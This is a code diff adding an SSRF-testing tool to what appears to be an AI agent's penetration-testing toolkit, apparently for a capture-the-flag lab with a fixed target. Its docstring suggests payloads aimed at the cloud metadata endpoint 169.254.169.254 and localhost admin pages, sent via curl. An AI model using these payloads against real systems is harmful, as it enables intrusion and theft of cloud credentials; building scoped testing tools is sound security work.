@@ -220,6 +220,61 @@ async def xxe_scanner(
     ]
 
     return await run_logged_tool(cmd, target=full_url)
+
+@tool
+async def ssrf_scanner(
+    payload: str,
+    endpoint: str = "/fetch",
+    parameter: str = "url",
+    method: str = "GET",
+    timeout: float = 30.0,
+) -> str:
+    """Test the configured target for Server-Side Request Forgery (SSRF) using curl.
+
+    The target URL is fixed (config.Target_url) and cannot be chosen here, by
+    design. You decide the SSRF payload (the URL you want the server to be
+    tricked into fetching -- e.g. an internal service or a cloud metadata
+    endpoint), which endpoint accepts a user-supplied URL, and which parameter
+    carries it.
+
+    Args:
+        payload: the URL the server should be made to fetch, e.g.
+            "http://169.254.169.254/latest/meta-data/" or "http://localhost/admin".
+        endpoint: the endpoint that fetches a user-supplied URL (default: "/fetch").
+        parameter: which parameter carries the URL (default: "url").
+        method: "GET" to send the URL in the query string, or "POST" for a form body.
+        timeout: request timeout in seconds.
+
+    Returns:
+        The HTTP response showing whether the server fetched the internal
+        resource (look for metadata, internal pages, or FLAG{...} in the body).
+    """
+    base_url = Target_url.rstrip("/")
+    full_url = f"{base_url}{endpoint}"
+
+    if method.upper() == "POST":
+        cmd = [
+            "curl",
+            "-X", "POST",
+            "-d", f"{parameter}={payload}",
+            "--max-time", str(int(timeout)),
+            "-i",
+            full_url,
+        ]
+    else:
+        # -G + --data-urlencode appends the URL-encoded payload as the query
+        # string, so an SSRF URL (with its own :// and ?params) stays intact.
+        cmd = [
+            "curl",
+            "-G",
+            "--data-urlencode", f"{parameter}={payload}",
+            "--max-time", str(int(timeout)),
+            "-i",
+            full_url,
+        ]
+
+    return await run_logged_tool(cmd, target=full_url)
+
 @tool
 async def web_recon(depth: int = 2, max_pages: int = 20, fingerprint: bool = True) -> str:
     """Map the authorized target's attack surface for the other specialists.
